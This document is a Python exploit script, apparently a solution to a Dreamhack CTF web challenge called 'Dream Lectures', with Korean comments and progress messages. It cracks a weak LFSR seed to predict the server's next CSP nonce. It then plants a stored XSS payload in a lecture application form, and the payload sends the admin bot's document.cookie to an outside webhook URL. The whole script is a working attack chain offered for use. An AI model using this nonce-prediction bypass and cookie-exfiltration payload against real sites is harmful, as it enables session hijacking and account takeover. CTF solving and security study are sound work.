import requests
import re
import sys

# Target URL (서버 주소에 맞게 수정 필요 시 변경)
TARGET_URL = "http://host3.dreamhack.games:21737"

# 어드민 세션 쿠키를 전달받을 본인의 웹훅 URL을 입력하세요. (예: https://webhook.site/...)
WEBHOOK_URL = "https://webhooksite.net/5c337e9e-4316-4545-983b-ab895c23b065"

print("==================================================")
print("[*] Dream Lectures - Exploit Script")
print("==================================================")

print("\n[1] LFSR Nonce 테이블 사전 계산 중... (수 초 내로 완료됩니다)")

def get_rand32bits(seed):
    rand32bits = 0
    for i in range(32):
        rand32bits |= (seed & 1) << i
        feedback = seed & 1 ^ seed >> 2 & 1 ^ seed >> 3 & 1 ^ seed >> 5 & 1
        seed = (seed >> 1) | feedback << 15
    return rand32bits, seed

def get_nonce(seed):
    nonce = 0
    for i in range(4):
        randn, seed = get_rand32bits(seed)
        nonce |= randn << i * 32
    nonce ^= 0xbeefbeefcafecafe13371337defaced0
    return nonce, seed

nonce_to_seed = {}
seed_to_next_nonce = {}

# 1부터 65535까지의 모든 시드에 대해 현재 논스와 다음 논스를 미리 계산합니다.
for initial_seed in range(1, 65536):
    n1, s1 = get_nonce(initial_seed)
    n2, s2 = get_nonce(s1)
    str_n1 = hex(n1)[2:]
    str_n2 = hex(n2)[2:]
    nonce_to_seed[str_n1] = initial_seed
    seed_to_next_nonce[initial_seed] = str_n2

print(f"  -> 계산 완료! 총 {len(nonce_to_seed)}개의 상태가 메모리에 로드되었습니다.")

session = requests.Session()

print("\n[2] 사이트 회원가입 및 로그인 진행 중...")
username = "hacker_gemini"
password = "password123!"

print(f"  -> POST /sign_up (User: {username})")
res_signup = session.post(f"{TARGET_URL}/sign_up", data={"username": username, "password": password})
print(f"  -> 회원가입 응답 코드: {res_signup.status_code}")

print(f"  -> POST /sign_in (User: {username})")
res_signin = session.post(f"{TARGET_URL}/sign_in", data={"username": username, "password": password})
print(f"  -> 로그인 응답 코드: {res_signin.status_code}")

print("\n[3] 서버의 현재 상태(CSP Nonce) 탈취를 위한 더미 요청 전송...")
res_lectures = session.get(f"{TARGET_URL}/lectures")
print(f"  -> GET /lectures 응답 코드: {res_lectures.status_code}")

csp_header = res_lectures.headers.get("Content-Security-Policy", "")
print(f"  -> 수신된 CSP 헤더: {csp_header}")

# 정규식을 활용해 헤더에서 nonce 값만 추출
match = re.search(r"nonce-([a-f0-9]+)", csp_header)
if not match:
    print("[-] 오류: 응답에서 CSP nonce를 찾을 수 없습니다. 서버 상태를 확인해주세요.")
    sys.exit(1)

current_nonce = match.group(1)
print(f"  -> 추출된 현재 Nonce: {current_nonce}")

print("\n[4] Seed 역산 및 다음 Nonce 예측 중...")
if current_nonce not in nonce_to_seed:
    print("[-] 오류: 해당 Nonce를 생성한 Seed를 찾을 수 없습니다! 서버가 재시작되었거나 로직이 다를 수 있습니다.")
    sys.exit(1)

cracked_seed = nonce_to_seed[current_nonce]
next_nonce = seed_to_next_nonce[cracked_seed]

print(f"  -> [SUCCESS] 서버 내부 Seed 역산 성공: {cracked_seed}")
print(f"  -> [SUCCESS] 어드민 봇 방문 시 사용될 다음 Nonce 예측 완료: {next_nonce}")

print("\n[5] XSS 페이로드 장전 및 폼 제출...")
# 탈취한 쿠키를 웹훅으로 보내는 악성 스크립트. 예측한 nonce 값을 우회용으로 삽입합니다.
xss_payload = f"<script nonce=\"{next_nonce}\">location.href='{WEBHOOK_URL}?c='+document.cookie;</script>"
print(f"  -> 최종 페이로드: {xss_payload}")

apply_data = {
    "lecture_id": "1",  # 아무 강의나 신청 가능
    "applicant_name": "Pwned By Gemini",
    "email": "gemini@hacker.com", # @ 포함 필수
    "contact": "010-1337-1337",   # - 포함 필수
    "reason": xss_payload
}

print("  -> POST /apply_lecture 전송 (어드민 봇 트리거)")
res_apply = session.post(f"{TARGET_URL}/apply_lecture", data=apply_data)
print(f"  -> POST 응답 코드: {res_apply.status_code}")

print("\n[6] 익스플로잇 완료!")
print("  -> 웹훅 사이트의 로그를 확인해 보세요. 어드민 봇의 세션 쿠키가 도착해 있을 것입니다.")
print("  -> 획득한 쿠키를 브라우저 개발자 도구(F12)의 Application -> Cookies 에 덮어씌운 뒤,")
print("  -> /admin 페이지로 이동하시면 플래그를 획득하실 수 있습니다.")